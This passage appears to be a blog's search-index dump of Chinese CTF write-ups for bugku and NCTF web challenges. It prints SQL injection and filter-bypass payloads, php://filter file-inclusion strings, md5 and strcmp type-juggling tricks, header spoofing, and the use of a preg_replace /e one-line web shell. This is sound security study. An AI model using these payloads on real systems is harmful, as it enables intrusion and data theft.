直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64 1JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ base64解码后为url编码 1![never1](E:\\myblog\\szyblog\\source\\_posts\\bugku1\\never1.png)%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E url解码为源码 12345678910111213141516171819202122232425&lt;?phpf(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\"); //注意这里，flag应该藏在这里&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt; 果然藏在f4l2a3g.txt 正则？字符？1234567 &lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125; preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); 重点在这句话上，考点为正则表达式 定界符：/和/（一般来说是这两个，其实除了\\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：前面的字符重复4~7次； \\ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 因此可以写出符合要求的字符穿 keyakey22222key:/a/aaakeyb! 你从哪里来题目提示 are you from google? 你是从google来的吗 考察http头中的referer参数 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/ 那么就抓包修改referer这个参数 Referer: https://www.google.com/,直接go即可 md5 collision这题是NCTF的一道题，原题是给了源码 本地访问见到题目就想到了x-forwarded-for，本地地址可以使用IP:127.0.0.1 可以使用google浏览器的插件 也可以直接使用bp抓包修改x-forwarded-for","tags":[{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://sunzhengyu99.github.io/tags/cookie/"},{"name":"编码","slug":"编码","permalink":"https://sunzhengyu99.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"bugku1-10","date":"2020-09-06T14:26:41.000Z","path":"2020/09/06/bugku1-10/","text":"bugku刷题记录1 web2查看源码即可 计算器修改前端代码 GETpayload: ?what=flag POST 矛盾payload: ?num=1a 考察点：弱类型比较 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 测试代码 1234567&lt;?phpvar_dump(\"admin\"==0); //truevar_dump(\"1admin\"==1); //truevar_dump(\"admin1\"==1) //falsevar_dump(\"admin1\"==0) //truevar_dump(\"0e123456\"==\"0e4456789\"); //true?&gt; //上述代码可自行测试 1231 观察上述代码，\"admin\"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等2 \"1admin\"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是\"admin1\"被转化成了0,为什么呢？？3 \"0e123456\"==\"0e456789\"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 web3查看源码后，在最下面看到一串编码，为unicode编码 1&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 使用工具转换为字符穿 域名解析dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名 hosts就是本地用来解析域名为IP 因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问 （hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts） 路径为：C:\\Windows\\System32\\drivers\\etc 文件保存后在浏览器中访问该域名 获得flag 你必须让他停下打开页面什么也没有，源码也没有什么发现，抓包试试 go完也没什么反应，有点迷惑 但是多go几次后，发现有张图片在变 多go几次就出来了flag,原理还未知 变量1123456789101112 &lt;?php error_reporting(0);include \"flag1.php\";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\");&#125;?&gt; 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 GLOBALS:一个包含了全部变量的全局组合数组 即将include”flag.php”作为全局变量在本页面输出 ?args=GLOBALS web5源码中一串特别的代码直接放在浏览器的控制台中运行 头等舱打开页面什么也没有 扫描目录，扫出来一大堆没用的，直接抓包 。。。。就出来了 网站被黑名字提示了，网站被黑。 打开题目，发现鼠标动不了，可能是被黑后的后遗症 先扫描目录发现了shell.php,这可能是上次黑客留下的小马文件 打开页面，需要密码，这就需要爆破了(查看了wp,知道了密码为hack,不知道时就需要一个足够大的密码字典才能破解) 确定要爆破的变量 加载密码字典 出现结果（根据length确定密码） 密码为hack 登录即可 管理员系统随便输入一个账号发现提示IP 想到了X-FORWORADED-FOR:127.0.0.1 抓包试试 在响应包中发现一段base64编码dGVzdDEyMw== 解密后为test123，猜测为登录密码 结果真对了 当然这题也可以使用爆破的方法做，但是密码字典需要包含test123 web4查看源码发现一段js代码 将最后的eval改成alert(),直接在浏览器中运行弹出结果 12345678910function checkSubmit()&#123;var a=document.getElementById(\"password\");if(\"undefined\"!=typeof a)&#123;if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value)return!0;alert(\"Error\");a.focus();return!1&#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) 直接输入67d709b2b54aa2aa648cf6e87a7114f1 flag在index里题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有 注意到了url:http://123.206.87.240:8005/post/index.php?file=show.php 出现file这个参数，想到了文件包含的漏洞 用下面的payload,获取index.php，源码的base64值 ?file=php://filter/read=convert.base64-encode/resource=index.php 1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 解码为 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; 获取flag{edulcni_elif_lacol_si_siht} 请输入密码提示了5位数的密码，直接爆破 备份是个好习惯打开题目后，出现一段代码，应该是md5值，可是解码为空密码 扫描目录python dirsearch.py -u http://123.206.87.240:8002/web16/ -e php 发现了index.php.bak 这个应该是在编辑这个文件时，自动生成的备份文件；EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；如果编辑后没有什么问题；可以删除.BAK文件 (来自百度) 下载.bak文件打开后，发现源码，开始审计 12345678910111213141516171819202122&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);//对key进行了过滤parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;//这里需要使用md()函数对数组处理时的漏洞 echo $flag.\"取得flag\";&#125;?&gt; url:http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 成绩单1231' and 1=1 # 1' and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4 #可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) 秋名山车神看到题目就知道需要用python的脚本来做（菜鸡不配），网上找的脚本 123456789101112import requestsimport reurl='http://120.24.86.145:8002/qiumingshan/'r=requests.session()requestpage = r.get(url)ans=re.findall('&lt;div&gt;(.*?)=?;&lt;/div&gt;',requestpage.text)#获取表达式，我正则写的好像有点问题，多匹配了最后的=?两个字符ans=\"\".join(ans)#列表转为字符串ans=ans[:-2]#去掉最后的=?post=eval(ans)#计算表达式的值data=&#123;'value':post&#125;#构造post的data部分flag=r.post(url,data=data)print(flag.text)","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"域名解析","slug":"域名解析","permalink":"https://sunzhengyu99.github.io/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"},{"name":"爆破","slug":"爆破","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%86%E7%A0%B4/"},{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"综合2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/综合2/","text":"NCTF-综合2 进入页面，没什么特别的地方，随便点点 留言可以正常提交，本以为有xss,但是已经提示不是xss 看到最下面有个网站说明 本CMS说明 ，有用的内容如下 config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索 admin表结构 create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txt可以使用php伪协议任意读取文件内容。 包括自己 尝试读取index.php的源码，发现好像并没有什么用 读取about.php 123456789101112131415161718&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; 有config.php echo &quot;file参数不能为空！&quot;; exit();&#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;包含了 loginxlcteam页面 if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;; &#125;&#125; 读取config.php，无有用信息 查看loginxlcteam,是个登录页面 到此还是无从下手，参考大佬的博客 https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase 在搜索页面中也存在有用信息 http://cms.nuptzj.cn/about.php?file=so.php获取源码 123456789101112131415161718192021&lt;?php //so.phpif($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123; //必须修改http头，吧user-agent改成Xlcteam Browserecho '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit();&#125;$id=$_POST['soid']; //post 一个soidinclude 'config.php';include 'antiinject.php'; //防注入的文件include 'antixss.php'; //防xss的文件 $id=antiinject($id); //对id过滤$con = mysql_connect($db_address,$db_user,$db_pass) or die(\"不能连接到数据库！！\".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\"); //sql查询，可能存在注入点$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt; 123456789101112&lt;?php //antiinject.php源码 function antiinject($content) &#123; $keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\"); //对一些sql注入时用到的关键词进行了过滤 $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], '',$info); &#125; return $info; &#125; ?&gt; 大致意思就是 1.判断http请求头中的user-agent参数是否为Xlcteam Browser 2.post参数soid 3.对soid进行过滤后带入sql语句中查询 于是抓包修改user-agent 确定存在注入点 由于之前提示了admin表结构 create table admin ( id integer, username text, userpass text, ) 可直接写出查询语句 1(sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCII码转字符串结果为： fuckruntu 登录 http://cms.nuptzj.cn/about.php?file=xlcteam.php 查看源码 12345 &lt;?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] =&gt; '|.*|e',); array_walk($arr, $e, ''); ?&gt; 看样子是可以用菜刀连接的 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：参考https://www.jb51.net/article/38714.htm简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。用菜刀连接： url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace 密码：wtf 总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"}]},{"title":"nctf-2","date":"2020-09-02T09:13:08.000Z","path":"2020/09/02/nctf-2/","text":"NCTF-2 SQL注入1题目源码给出 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125;&#125;echo $query[user];?&gt; 首先post方法传递user和pass两个参数，然后带入sql语句中查询 注入点在这个位置 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot; select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;) 构造语句 select user from ctf where (user=&#39;admin&#39;) or 1=1 #) and (pw=&#39;&#39;) 在username中填入admin&#39;) or 1=1 #或者admin&#39;) and 1=1 #，提交即可获得flag passcheck12345678910111213$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo \"flag:nctf&#123;*&#125;\";&#125;else&#123;echo \"the pass is wrong!\";&#125;&#125;else&#123;echo \"please input pass!\";&#125;?&gt; strcmp() 函数比较两个字符串。 注释：strcmp() 函数是二进制安全的，且对大小写敏感。 提示：该函数与 strncmp() 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。 只有pass==pass1时才显示flag 感觉跟之前的变量覆盖相似 知识点： strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0； hackbar的使用，post方法 php弱类型，数组的使用。 参考： https://www.cnblogs.com/islsy/p/10667426.html 起名字真难123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //number中的数字不能在1-9 &#123; return false; &#125; &#125; return $number == '54975581388'; //number的值等于54975581388，与之前if语句矛盾&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 尝试将54975581388转成十六进制 0xccccccccc, c的a值为12，满足if判断语句 ?key=0xccccccccc sqlinject查看源码 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //防止注入 $str=stripslashes($str); //添加 \\ &#125; return htmlentities($str, ENT_QUOTES);//过滤掉单引号，双引号，或者兼而有之&#125;$username = @clean((string)$_GET['username']);//对获取的参数进行了处理$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';//存在注入的语句$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag;--&gt; magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;; 反斜杠遇到单引号后，起到转义作用，实际sql语句如下 SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;; 这里注入与之前的注入不同，这里针对的是password SELECT * FROM users WHERE name=&#39; \\&#39; AND pass=&#39; or 1=1 --+&#39;; \\&#39; AND pass= 作为name 参数的值 所以构造?name=&amp;password=or 1=1 –+ SQL注入2123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; //post 方式接收两个参数 mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]);//对pass md5加密 $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));//获取pw字段的值 if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; // 比较pass和pw echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125;&#125;?&gt; poyload: user= &#39; union select md(1) &amp;pass=1 select pw from ctf where user=&#39;&#39; union select md(1) 此查询语句获得我pw值为md(1),所以if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))语句成立，显示flag (还没完全理解) 综合题 首页中给出很长的jsfuck，可以使用浏览器的console解码 ,给出一个页面 访问 1bc29b36f623ba82aaf6724fd3b16718.php 提示在header里 查看header history of bash使用过linux的同志会知道，如果使用的是bash，在家目录中会生成.bash_history文件用来保存历史命令。访问.bash_history文件，可以得到这样的历史命令 url: http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 获得zip -r flagbak.zip ./* 访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip file_get_contents查看源码获取被注释的内容 1234$file = $_GET['file'];if(@file_get_contents($file) == \"meizijiu\")&#123; echo $nctf;&#125; 分析可得 通过get方式传递flle=文件名并且这个文件的内容==‘meizijiu’如果等于就打印flag php伪协议php://input来构造原始数据的只读流 变量覆盖参考 https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1 源码 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == \"meizijiu233\")&#123; echo $flag;&#125;--&gt; ?name=meizijiu233","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"nctf","date":"2020-08-29T14:38:08.000Z","path":"2020/08/29/nctf/","text":"nctf-1 签到题查看源码即可看到flag md5 collision一道简单的md5漏洞题目 md5函数漏洞 源码 12345678910$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\";&#125; else &#123; echo \"false!!!\";&#125;&#125;else&#123;echo \"please input a\";&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 1234567891011QNKCDZO240610708s878926199as155964671as214587387as214587387a sha1(str)sha1('aaroZmOk') sha1('aaK1STfY')sha1('aaO8zKZF')sha1('aa3OFF9m') 签到2提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母 F12审查元素，修改输入框的maxlength值，大于11即可 再次输入口令即可。 考点为前端代码修改 这题不是WEB这道题还真不是web 进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex 层层递进 题目为层层递进，通过F12中Sources功能，查看网站的包含情况，发现到可疑地址：SO.html，查看发现相似可以地址，最后在404.html源码中得到flag（竖排插入在标签中）： 单身二十年tip:在这里找key 点击发现url改变，跳转到了另一个页面 bp抓包试试，go一下，相应包中出现flag phpencode一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错 将最后的eval改为echo,提交运行即可 LFI 黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。 根据PHP伪协议尝试构造如下Payload：?file=php://filter/read=convert.base64-encode/resource=index.php，将index.php的源码经过Base64编码输出 PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= base64解码 1234567891011121314&lt;html&gt; &lt;title&gt;asdf&lt;&#x2F;title&gt;&lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; 